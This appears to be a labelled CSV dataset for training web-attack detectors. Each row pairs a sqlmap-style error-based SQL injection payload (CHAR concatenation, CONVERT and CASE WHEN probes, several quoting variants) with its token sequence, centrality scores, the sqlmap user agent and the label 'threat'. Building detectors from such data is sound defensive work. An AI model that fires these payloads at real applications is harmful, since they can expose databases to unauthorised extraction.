payload,token,centrality,requestmethod,uagent,label
1' AND 8633 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8633=8633) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND 'oOdv' LIKE 'oOdv,INT SQUT AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND SQUT STR SQUT LIKE SQUT STR,0.07272727272727272 0.09090909090909091 0.10909090909090909 0.12727272727272726 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.12727272727272726 0.10909090909090909 0.09090909090909091 0.07272727272727272,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1' AND 8633 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8633=8633) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND 'oOdv' LIKE 'oOdv,INT SQUT AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND SQUT STR SQUT LIKE SQUT STR,0.07272727272727272 0.09090909090909091 0.10909090909090909 0.12727272727272726 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.12727272727272726 0.10909090909090909 0.09090909090909091 0.07272727272727272,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"" AND 8633 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8633=8633) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND ""OnMA""=""OnMA",INT DQUT AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND DQUT STR DQUT EQ DQUT STR,0.07272727272727272 0.09090909090909091 0.10909090909090909 0.12727272727272726 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.12727272727272726 0.10909090909090909 0.09090909090909091 0.07272727272727272,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1%' AND 8633 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8633=8633) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND '%'=',INT PRCNT SQUT AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND SQUT PRCNT SQUT EQ SQUT,0.07272727272727272 0.09090909090909091 0.10909090909090909 0.12727272727272726 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.12727272727272726 0.10909090909090909 0.09090909090909091 0.07272727272727272,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1%' AND 8633 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8633=8633) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND '%'=',INT PRCNT SQUT AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND SQUT PRCNT SQUT EQ SQUT,0.07272727272727272 0.09090909090909091 0.10909090909090909 0.12727272727272726 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.12727272727272726 0.10909090909090909 0.09090909090909091 0.07272727272727272,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1)) AND 6927=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (6927=6927) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND ((2312=2312",INT RPRN RPRN AND INT EQ CONVERT INT CMMA SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN LPRN INT EQ INT,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1)) AND 6927=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (6927=6927) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND ((2312=2312",INT RPRN RPRN AND INT EQ CONVERT INT CMMA SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN LPRN INT EQ INT,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1 AND 6927=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (6927=6927) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113)))",INT AND INT EQ CONVERT INT CMMA SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT,0.08 0.1 0.12 0.14 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.14 0.12 0.1 0.08,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1 AND 6927=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (6927=6927) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113)))",INT AND INT EQ CONVERT INT CMMA SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT,0.08 0.1 0.12 0.14 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.14 0.12 0.1 0.08,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1')) AND 6927=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (6927=6927) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND (('EgMn'='EgMn",INT SQUT RPRN RPRN AND INT EQ CONVERT INT CMMA SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.06451612903225806 0.08064516129032258 0.0967741935483871 0.11290322580645161 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.11290322580645161 0.0967741935483871 0.08064516129032258 0.06451612903225806,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1')) AND 6927=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (6927=6927) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND (('EgMn'='EgMn",INT SQUT RPRN RPRN AND INT EQ CONVERT INT CMMA SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.06451612903225806 0.08064516129032258 0.0967741935483871 0.11290322580645161 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.11290322580645161 0.0967741935483871 0.08064516129032258 0.06451612903225806,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1') AND 6927=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (6927=6927) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND ('VJfP' LIKE 'VJfP",INT SQUT RPRN AND INT EQ CONVERT INT CMMA SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.06666666666666667 0.08333333333333333 0.1 0.11666666666666667 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.11666666666666667 0.1 0.08333333333333333 0.06666666666666667,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1') AND 6927=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (6927=6927) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND ('VJfP' LIKE 'VJfP",INT SQUT RPRN AND INT EQ CONVERT INT CMMA SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.06666666666666667 0.08333333333333333 0.1 0.11666666666666667 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.11666666666666667 0.1 0.08333333333333333 0.06666666666666667,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
